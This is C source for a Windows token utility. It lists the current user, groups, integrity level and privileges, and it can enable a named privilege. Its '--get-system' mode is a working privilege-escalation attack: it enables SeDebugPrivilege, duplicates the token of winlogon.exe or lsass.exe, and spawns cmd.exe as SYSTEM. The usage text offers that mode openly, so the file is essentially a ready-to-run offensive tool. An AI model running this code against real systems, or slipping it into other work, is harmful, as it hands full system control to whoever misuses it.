#include <windows.h>
#include <stdio.h>
#include <sddl.h>
#include <tlhelp32.h>
#include <string.h>

VOID GetPrivileges( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenPrivileges, NULL, 0, &dwReturnLength );
    PTOKEN_PRIVILEGES pTokenInformation = ( PTOKEN_PRIVILEGES )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenPrivileges, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }

    printf( "%-50s  %-10s\n", "Privilege", "State" );
    printf( "%-50s  %-10s\n", "=====================================", "=========" );

    for ( DWORD i = 0; i < pTokenInformation->PrivilegeCount; i++ ) {
        CHAR Name[ 256 ] = { 0 };
        DWORD NameSize = sizeof( Name );
        if ( !LookupPrivilegeNameA( NULL, &pTokenInformation->Privileges[ i ].Luid, Name, &NameSize ) ) {
            printf( "[-] LookupPrivilegeNameA failed for privilege %lu with error: %lu\n", i + 1, GetLastError() );
        }
        else {
            printf( "%-50s  %-10s\n", Name, ( pTokenInformation->Privileges[ i ].Attributes & SE_PRIVILEGE_ENABLED ) ? "Enabled" : "Disabled" );
        }
    }
}

// VOID EnablePrivilege( HANDLE hToken, LPCSTR PrivilegeName ) {

//     LUID luid;
//     if ( !LookupPrivilegeValueA( NULL, PrivilegeName, &luid ) ) {
//         printf( "[-] LookupPrivilegeValueA failed with error: %lu\n", GetLastError() );
//         return;
//     }

//     TOKEN_PRIVILEGES TokenPrivileges = { 0 };
//     TokenPrivileges.PrivilegeCount = 1;
//     TokenPrivileges.Privileges[ 0 ].Luid = luid;
//     TokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

//     if ( !AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, sizeof( TokenPrivileges ), NULL, NULL ) ) {
//         printf( "[-] AdjustTokenPrivileges failed with error: %lu\n", GetLastError() );
//         return;
//     }

//     if ( GetLastError() == ERROR_NOT_ALL_ASSIGNED ) {
//         printf( "[!] The token does not have the specified privilege: %s\n", PrivilegeName );
//         return;
//     }

// }

VOID GetUser( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenUser, NULL, 0, &dwReturnLength );
    PTOKEN_USER pTokenInformation = ( PTOKEN_USER )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenUser, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }

    PCHAR sidString = NULL;
    ConvertSidToStringSidA( pTokenInformation->User.Sid, &sidString );


    CHAR Name[ 256 ] = { 0 };
    CHAR Domain[ 256 ] = { 0 };
    DWORD NameSize = sizeof( Name );
    DWORD DomainSize = sizeof( Domain );
    SID_NAME_USE SidType;
    if ( !LookupAccountSidA( NULL, pTokenInformation->User.Sid, Name, &NameSize, Domain, &DomainSize, &SidType ) ) {
        printf( "[-] LookupAccountSidA failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    printf( "%-10s: %s\\%s\n", "User", Domain, Name );
    printf( "%-10s: %s\n", "SID", sidString );
}

VOID GetElevation( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenElevation, NULL, 0, &dwReturnLength );
    PVOID pTokenInformation = HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenElevation, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    printf( "%-10s: %s\n", "Elevation", ( ( TOKEN_ELEVATION* )pTokenInformation )->TokenIsElevated ? "Yes" : "No" );
    HeapFree( GetProcessHeap(), 0, pTokenInformation );
    // CloseHandle( hToken );
}

VOID GetGroups( HANDLE hToken ) {
    DWORD dwReturnLength = 0;
    GetTokenInformation( hToken, TokenGroups, NULL, 0, &dwReturnLength );
    PTOKEN_GROUPS pTokenInformation = ( PTOKEN_GROUPS )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturnLength );
    if ( !GetTokenInformation( hToken, TokenGroups, pTokenInformation, dwReturnLength, &dwReturnLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    printf( "%-10s:\n", "Groups" );
    for ( DWORD i = 0; i < pTokenInformation->GroupCount; i++ ) {
        CHAR Name[ 256 ] = { 0 };
        CHAR Domain[ 256 ] = { 0 };
        DWORD NameSize = sizeof( Name );
        DWORD DomainSize = sizeof( Domain );
        SID_NAME_USE SidType;
        if ( LookupAccountSidA( NULL, pTokenInformation->Groups[ i ].Sid, Name, &NameSize, Domain, &DomainSize, &SidType ) ) {
            // printf( "   %s%s%s\n", Domain[ 0 ] == '\0' ? "" : Domain, Domain[ 0 ] == '\0' ? "" : "\\", Name );
            if ( strcmp( Name, "None" ) != 0 ) {
                if ( Domain[ 0 ] != '\0' ) {
                    printf( "   %s\\%s\n", Domain, Name );
                }
                else {
                    printf( "   %s\n", Name );
                }
            }
        }
        else {
            printf( "[-] LookupAccountSidA failed for group %lu with error: %lu\n", i + 1, GetLastError() );
        }
    }

    HeapFree( GetProcessHeap(), 0, pTokenInformation );
    // CloseHandle( hToken );
}

VOID GetIntegrity( HANDLE hToken ) {
    DWORD dwReturunLength = 0;
    GetTokenInformation( hToken, TokenIntegrityLevel, NULL, 0, &dwReturunLength );
    PTOKEN_MANDATORY_LABEL pTokenInformation = ( PTOKEN_MANDATORY_LABEL )HeapAlloc( GetProcessHeap(), HEAP_ZERO_MEMORY, dwReturunLength );
    if ( !GetTokenInformation( hToken, TokenIntegrityLevel, pTokenInformation, dwReturunLength, &dwReturunLength ) ) {
        printf( "[-] GetTokenInformation failed with error: %lu", GetLastError() );
        HeapFree( GetProcessHeap(), 0, pTokenInformation );
        CloseHandle( hToken );
        return;
    }
    DWORD Rid = *GetSidSubAuthority( pTokenInformation->Label.Sid, ( DWORD )( UCHAR )( *GetSidSubAuthorityCount( pTokenInformation->Label.Sid ) - 1 ) );

    CONST CHAR* name = "?";
    if ( Rid == SECURITY_MANDATORY_UNTRUSTED_RID ) {
        name = "Untrusted";
    }
    else if ( Rid == SECURITY_MANDATORY_LOW_RID ) {
        name = "Low";
    }
    else if ( Rid == SECURITY_MANDATORY_MEDIUM_RID ) {
        name = "Medium";
    }
    else if ( Rid == SECURITY_MANDATORY_HIGH_RID ) {
        name = "High";
    }
    else if ( Rid == SECURITY_MANDATORY_SYSTEM_RID ) {
        name = "System";
    }
    else if ( Rid == SECURITY_MANDATORY_PROTECTED_PROCESS_RID ) {
        name = "Protected Process";
    }

    printf( "%-10s: %s\n", "Integrity", name );

    HeapFree( GetProcessHeap(), 0, pTokenInformation );
    // CloseHandle( hToken );
}

BOOL EnablePrivilege( HANDLE hToken, LPCSTR PrivilegeName ) {
    LUID luid;
    if ( !LookupPrivilegeValueA( NULL, PrivilegeName, &luid ) ) {
        printf( "[-] LookupPrivilegeValueA failed with error: %lu\n", GetLastError() );
        return FALSE;
    }

    TOKEN_PRIVILEGES TokenPrivileges = { 0 };
    TokenPrivileges.PrivilegeCount = 1;
    TokenPrivileges.Privileges[ 0 ].Luid = luid;
    TokenPrivileges.Privileges[ 0 ].Attributes = SE_PRIVILEGE_ENABLED;

    if ( !AdjustTokenPrivileges( hToken, FALSE, &TokenPrivileges, sizeof( TOKEN_PRIVILEGES ), NULL, NULL ) ) {
        printf( "[-] AdjustTokenPrivileges failed with error: %lu\n", GetLastError() );
        return FALSE;
    }

    DWORD dwError = GetLastError();
    if ( dwError == ERROR_NOT_ALL_ASSIGNED ) {
        printf( "[!] The token does not have the specified privilege: %s\n", PrivilegeName );
        return FALSE;
    }
    else if ( dwError != ERROR_SUCCESS ) {
        printf( "[-] Failed to enable privilege '%s'. Error: %lu\n", PrivilegeName, dwError );
        return FALSE;
    }

    printf( "[+] Privilege '%s' enabled successfully.\n", PrivilegeName );
    return TRUE;
}

VOID GetSystem() {
    HANDLE hCurToken = NULL;
    if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hCurToken ) ) {
        printf( "[-] OpenProcessToken failed with error: %lu\n", GetLastError() );
        return;
    }

    EnablePrivilege( hCurToken, SE_DEBUG_NAME );

    HANDLE hSnapshot = CreateToolhelp32Snapshot( TH32CS_SNAPPROCESS, 0 );
    if ( hSnapshot == INVALID_HANDLE_VALUE ) {
        printf( "[-] CreateToolhelp32Snapshot failed with error: %lu\n", GetLastError() );
        CloseHandle( hCurToken );
        return;
    }

    HANDLE hProcess = NULL;
    HANDLE hToken = NULL;
    HANDLE hDupToken = NULL;
    BOOL bFound = FALSE;

    PROCESSENTRY32 pe32;
    pe32.dwSize = sizeof( PROCESSENTRY32 );

    if ( Process32First( hSnapshot, &pe32 ) ) {
        do {
            // Try winlogon.exe first, then lsass.exe as backup
            if ( strcmp( pe32.szExeFile, "winlogon.exe" ) == 0 ||
                strcmp( pe32.szExeFile, "lsass.exe" ) == 0 ) {

                printf( "[*] Found %s with PID: %lu\n", pe32.szExeFile, pe32.th32ProcessID );

                hProcess = OpenProcess( PROCESS_QUERY_INFORMATION, FALSE, pe32.th32ProcessID );
                if ( hProcess == NULL ) {
                    printf( "[-] OpenProcess failed for %s: %lu\n", pe32.szExeFile, GetLastError() );
                    continue;
                }

                if ( !OpenProcessToken( hProcess, TOKEN_DUPLICATE | TOKEN_QUERY, &hToken ) ) {
                    printf( "[-] OpenProcessToken failed: %lu\n", GetLastError() );
                    CloseHandle( hProcess );
                    hProcess = NULL;
                    continue;
                }

                if ( !DuplicateTokenEx( hToken, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &hDupToken ) ) {
                    printf( "[-] DuplicateTokenEx failed: %lu\n", GetLastError() );
                    CloseHandle( hProcess );
                    CloseHandle( hToken );
                    hProcess = NULL;
                    hToken = NULL;
                    continue;
                }

                // Try to create process with the duplicated token
                STARTUPINFOW si = { 0 };
                si.cb = sizeof( STARTUPINFOW );
                PROCESS_INFORMATION pi = { 0 };

                if ( CreateProcessWithTokenW( hDupToken, LOGON_WITH_PROFILE,
                    L"C:\\Windows\\System32\\cmd.exe", NULL, CREATE_NEW_CONSOLE,
                    NULL, NULL, &si, &pi ) ) {

                    printf( "[+] Created SYSTEM process with PID: %lu\n", pi.dwProcessId );
                    CloseHandle( pi.hProcess );
                    CloseHandle( pi.hThread );
                    bFound = TRUE;
                    break;  // Success, exit the loop
                }
                else {
                    printf( "[-] CreateProcessWithTokenW failed: %lu\n", GetLastError() );
                    // Clean up and try next process
                    CloseHandle( hProcess );
                    CloseHandle( hToken );
                    CloseHandle( hDupToken );
                    hProcess = NULL;
                    hToken = NULL;
                    hDupToken = NULL;
                }
            }
        } while ( Process32Next( hSnapshot, &pe32 ) );
    }

    if ( !bFound ) {
        printf( "[!] Failed to create SYSTEM process from available tokens\n" );
    }

    // Cleanup
    if ( hSnapshot != INVALID_HANDLE_VALUE ) CloseHandle( hSnapshot );
    if ( hProcess != NULL ) CloseHandle( hProcess );
    if ( hToken != NULL ) CloseHandle( hToken );
    if ( hDupToken != NULL ) CloseHandle( hDupToken );
    CloseHandle( hCurToken );
}

int main( int argc, char* argv[] ) {
    if ( argc < 2 ) {
        printf( "Usage: \n" );
        printf( "  %s --list-tokens\n", argv[ 0 ] );
        printf( "  %s --enable-privilege <privilege-name>\n", argv[ 0 ] );
        printf( "  %s --get-system\n", argv[ 0 ] );
        printf( "\nExamples:\n" );
        printf( "  %s --list-tokens\n", argv[ 0 ] );
        printf( "  %s --enable-privilege SeDebugPrivilege\n", argv[ 0 ] );
        printf( "  %s --enable-privilege SeImpersonatePrivilege\n", argv[ 0 ] );
        printf( "  %s --get-system\n", argv[ 0 ] );
        return 1;
    }

    if ( strcmp( argv[ 1 ], "--list-tokens" ) == 0 ) {
        HANDLE hToken = NULL;
        if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_ALL_ACCESS, &hToken ) ) {
            printf( "[-] OpenProcessToken failed with error: %lu\n", GetLastError() );
            return 1;
        }

        GetUser( hToken );
        GetGroups( hToken );
        GetElevation( hToken );
        GetIntegrity( hToken );
        GetPrivileges( hToken );
        CloseHandle( hToken );
        return 0;
    }
    else if ( strcmp( argv[ 1 ], "--enable-privilege" ) == 0 ) {
        if ( argc < 3 ) {
            printf( "Usage: %s --enable-privilege <privilege-name>\n", argv[ 0 ] );
            printf( "Example: %s --enable-privilege SeDebugPrivilege\n", argv[ 0 ] );
            return 1;
        }

        HANDLE hToken = NULL;
        if ( !OpenProcessToken( GetCurrentProcess(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken ) ) {
            printf( "[-] OpenProcessToken failed with error: %lu\n", GetLastError() );
            return 1;
        }

        if ( EnablePrivilege( hToken, argv[ 2 ] ) ) {
            printf( "\nUpdated privileges:\n" );
            GetPrivileges( hToken );
        }

        CloseHandle( hToken );
        return 0;
    }
    else if ( strcmp( argv[ 1 ], "--get-system" ) == 0 ) {
        GetSystem();
        return 0;
    }
    else {
        printf( "[-] Invalid argument: %s\n", argv[ 1 ] );
        printf( "Use --list-tokens, --enable-privilege, or --get-system\n" );
        return 1;
    }
}